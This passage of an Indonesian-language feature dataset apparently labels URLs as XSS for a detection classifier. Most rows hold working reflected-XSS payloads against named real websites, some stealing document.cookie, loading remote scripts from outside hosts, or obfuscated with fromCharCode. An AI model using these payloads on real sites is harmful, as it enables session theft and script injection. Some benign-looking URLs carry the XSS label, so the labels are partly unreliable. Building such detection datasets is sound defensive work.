properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.penumbrapress.ca/book.php?id=312<script>location=\"\"http://www.Turkishajan.com/\"\"</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.peopleconnectionblog.com/search/?q=%3Ciframe+src+%3Dhttp%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DGmGIT16P-lI%22+width%3D%221000%22+height%3D%221000%22+\\%3E%3C%2Fdiv%3E&blog_submit=GO;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.phishtank.com/phish_screenshot.php?phish_id=%22%3E%3Cinput%20type=submit%20value=CLICK%A0HERE%A0TO%A0TRIGGER%A0XSS!%20onClick=confirm%28navigator.userAgent%29;alert%28/XSS%A0EXAMPLE/.source%29;eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,97,115,115,105,103,110,40,34,104,116,116,112,58,47,47,110,121,97,110,46,99,97,116,34,41));BODY%20BGCOLOR=%22#111111%22%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.phpriot.com/search?q=/\"\"><script>alert('Xss By Atm0n3r')</script>&x=47&y=14\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.picpiggy.com/list.php?q=pwn+%3CSCRIPT/SRC=%22http://tmp.vgood.com.tw/poc.js%22%3E%3C/SCRIPT%3E+pwn;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.pingplace.nl/forum/active.php;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.policybazaar.com/Application_Masters/IN/Images/ADBANNERS/200x150.swf?clickTag=javascript:alert(%22XSSED%22);\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.positifimmobilier.fr/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.projet-french-arena.org/wiki/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.pzl-wola.pl/index.php?page=home&lang=%22/%3E%3Cbody%20onload=alert(1)%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.race.com/checkavailability/index.php?zipcode=%22%2F%3E%3Cscript%3Ealert%28%22XSS%3A+Vijayendra%22%29%3C%2Fscript%3E&go=GO&page=results;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.rakno.de/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.readyicons.com/iconset-preview.php?id=11%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.real.com/realone/trial_terms.html?src=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.redaxo.org/de/wiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.rfcuny.org/hr/pvn/cgi-bin/error.asp?msg=<iframe src=\"\"http://xssed.com\"\">\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.riviera-housing.com/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.rockware.com/home/searchResult.php?searchQuery=%3Cscript%3Ealert%28%22XSS.by.03storic%22%29%3C%2Fscript%3E&x=23&y=6;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.rtl.de/suche/google/suche?sitesearch=rtl&q=%27};document.write(String.fromCharCode(60,115,9%209,114,105,112,116,62,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,%2041,60,47,115,99,114,105,112,116,62))%0avar%20xss={%27%27:%27\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://www.rutv.ru/?d=0'%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E;Antara 54 dan 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://www.saab.bg/test-drajv?form%5Bname%5D=111-222-1933email@address.tst&form%5Bemail%5D=>\"\"><ScRiPt%20%0a%0d>alert(/XSS%20By%20TurKPoweR/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR</h1></marquee>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.saab.hu/hirek-sajtoinformaciok/hirlevel?form%5Bname%5D=>\"\"><ScRiPt%20%0a%0d>alert(/XSS%20By%20TurKPoweR/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR</h1></marquee>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.saab.lv/main/GLOBAL/en/tirdzn_lietoti1.shtml?id=>\"\"><ScRiPt%20%0a%0d>alert(/XSS%20By%20TurKPoweR/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR</h1></marquee>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.saab.ro/drive-test?form%5Bname%5D=111-222-1933email@address.tst&form%5Bemail%5D=>\"\"><ScRiPt%20%0a%0d>alert(/XSS%20By%20TurKPoweR/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR</h1></marquee>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.sabteahval.ir/Page.aspx?search=%22%3E%3Cscript%3Ealert%28/amir/%29%3C/script%3E&mID=1290&Page=search/advancedsearch&mDefId=;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.safedrive.ge/_old/news.php?page=acs&lang=eng&p=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.salesforce.com/servlet/servlet.WebToLead?retURL=http%3A%2F%2Fwww.xssed.com%2F;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.samandehi.ir/mainMenuNL.html?conversationContext=%27%22()%26%251%3CScRiPt%3Ealert(%27xssed%27)%3C/ScRiPt%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.scene.org/newfiles.php?dayint=7&dir=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.scientology.org/churches/churches-of-scientology.html?video=org-cinn_tour%22;%3C/script%3E%3Cscri%20pt%3Ealert(/God%20hates%20you%20!/)%3C/script%3E%3Ciframe%20src=http://xssed.com/%3E%3C/iframe%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.seagfoffice.org/news_view.php?id=13%27%3E%3Cscript%3Ealert%28%22xss%22%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.searchcompletion.com/WebSearchResults.aspx?q=%22%2F%3E%3Ciframe+src%3D%22http%3A%2F%2Fgoogle.com%22%3E%3C%2Fiframe%3E&si=99&bi=0&safe=off&originalSiteSeachDomain=&site=web&prevsite=web&cl=0&st=&lang=en-US&fh=1&cc=IN&sa=++Search++;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.sephora.com/help/storeController.jhtml?country=france&city=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.sernin-immobilier.com/details.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.sesliebrar.com/?s=%22%3E%3Cscript%3Ealert%28%223spi0n%22%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.sfelipeneri.edu.ec/fedec/book/guestbook.php?act=show&page=2584&lang=%22%3E%3E%3Cscript%3Ealert%28%22\\\\_UR0B0R0X_/%22%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.shop.nsw.gov.au/online_payments.jsp?url=./\"\" onload=\"\"alert(/xss/)\";Antara 54 dan 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.shopparos.gr/results.asp?q=%22%3C/TITLE%3E%3CSCRIPT%3Ealert%28%22xss%20by%20d@ydream%22%29;%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.sicherheit.info/SI/cms.nsf/si.Articles.Search?SearchView&Query=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://www.sielaff.de/seite-empfehlen/?tipUrl=\"\"><script>alert(\"\"CrossSiteScripting2\"\")</script>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.simkom.com/sketchsite/image.php?id=126650775024196%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.si-wifi.org/send_mail.php?to=PEJPRFkgb25sb2FkPSJhbGVydCgnc2hlbGxjMGRlJyk7Ij4=&ID=1;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.skirmish-islands.com/inscription.php?w=1/%22%3E%3Cscript%3Ealert(%27Xss%20By%20Atm0n3r%27)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.smimmobiliernarbonne.com/listing.php?langID=fr/%22%3E%3Cscript%3Ealert(%27La%20patrone%20a%20de%20groooOoos%20seins%20!!%27)%3C/script%3E%3Cscript%20type=%22text/javascript%22%20src=%22http://yourjavascript.com/27544112151/xss.atmon3r.js%22%3E%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.softforall.com/searchresults.php?SearchProductName=%22%2F%3E%3Cscript%3Ealert%28%2FXSS-+Vijayendra%2F%29%3C%2Fscript%3E&x=17&y=10;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.sonovela.net/list.php?q=pwn+%3CSCRIPT/SRC=%22http://tmp.vgood.com.tw/poc.js%22%3E%3C/SCRIPT%3E+pwn;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.soul-chic.com/error.asp?msg=%3Ciframe%20src=%22http://xssed.com%22%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.sp.senac.br/jsp/search.jsp?newsID=DYNAMIC%2Coracle.br.dataservers.SearchDataServer%2CselectContent&template=477.dwt&context=A&keywords=%22%2Balert%28%27hi%27%29%2B%22&testeira=453;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.speakingtree.in/peoples.php?keyword=%22/%3E%3Cscript%3Ealert(%22Xss:Vijayendra%22)%3C/script%3E&search_type=all&x=0&y=0;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.speedbit.com/buy/?ref=%22--%3E%3Ciframe%20src=http://www.XSSed.com%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.spiegel.de/artikelversand/online/a-823270-de.html?f.emailempfang=<script>alert(navigator.userAgent)</script>;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.spielaffe.de/account/remote_login?user[auth_username]=%27%22%3E%3Cscript%3Ealert(navigator.userAgent)%3C/script%3E&layout=window;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://www.statshow.com/tag/\"\"><script>alert('XSS By Atm0n3r')</script>\";Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.suagacollection.com/photo-gallery.php?id=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.subisu.net.np/news/?cat=News\"\"><script>alert(\"\"XSS-by-Himanshu\"\");</script>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.symantec.com/flash/podcastPlayer.swf?file=http://www.gabbyattic.com/jokes/put%20down%20the%20gun.mp3&autoStart=false&songVolume=90;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.taartmeteenlindtje.nl/item.php?id=16%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.takealot.com/gaming/browse?&qsearch=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.takku-ligguey.org/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.tasteofsouthflorida.com/cgi-bin/tseekdir.cgi?location=Root-Miami,045Dade_Restaurants-South_Beach%27%3E%3Cscript%3Ealert%28%22Cr4t3r%20Was%20Here%22%29;//%3C/script%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.tejaratbank.ir/portal/Page.aspx?search=%3Cscript%3Ealert(document.cookie)%3C/script%3E&mID=518&Page=search/advancedsearch&mDefId=;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.thebakerscottage.com/store/error.asp?msg=<iframe src=\"\"http://xssed.com\"\">\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.thebestdata.com/zoom.aspx?menutype=1&auto=3240&t=ssssssssssss%22%3E%3Cimg%20src=x%20onerror=alert%28%27XSSED%27%29%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.thesecurityweb.co.uk/twiki/bin/view.pl/Security/SonyStyles;Antara 54 dan 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak 